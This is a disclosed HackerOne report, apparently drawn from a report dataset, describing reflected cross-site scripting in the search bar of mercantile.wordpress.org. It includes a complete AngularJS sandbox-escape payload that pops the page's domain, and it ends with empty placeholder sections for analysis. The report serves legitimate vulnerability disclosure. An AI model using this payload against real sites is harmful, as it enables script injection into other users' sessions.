---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '221893'
original_report_id: '221893'
title: XSS in the search bar of mercantile.wordpress.org
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: wordpress
created_at: '2017-04-18T13:40:36.012Z'
disclosed_at: '2017-05-20T12:03:33.225Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 19
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# XSS in the search bar of mercantile.wordpress.org

## Metadata

- HackerOne Report ID: 221893
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: wordpress
- Disclosed At: 2017-05-20T12:03:33.225Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi wordpress! Glad to see you here at H1.

       I found a XSS issue in the https://mercantile.wordpress.org/s=<payload here>
This works with the angular js payloads. I did inject a angular js code its because I found the `ng-bindable` in the source.

###STEPS TO REPRODUCE
1. Go to https://mercantile.wordpress.org
2. Click on search and put this payload:
>
`{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,prompt(document.domain)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}`
As you could now see the domain has been popped up.

If you have any questions just tell me and I will try my best to have an answer.

Kind Regards,
Tom

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
